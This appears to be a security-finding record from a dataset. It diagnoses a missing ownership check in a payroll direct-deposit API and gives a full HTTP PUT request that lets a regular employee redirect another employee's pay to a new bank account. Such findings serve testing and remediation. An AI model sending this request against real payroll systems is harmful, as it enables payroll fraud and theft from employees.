diagnosis: The direct deposit modification handler uses Joi to validate bank routing and account numbers, but trusts req.payrollData.employeeId directly from the request body. It fails to verify that req.user.employeeId matches employeeId, allowing any employee to redirect payroll payouts of colleagues or executives to their own bank account.
exploit_request:
PUT /api/payroll/direct-deposit HTTP/1.1
Host: payroll.corp.internal:7006
Authorization: Bearer <regular_employee_jwt>
Content-Type: application/json

{
  "employeeId": 1084,
  "bankRouting": "021000021",
  "accountNumber": "9918237419"
}
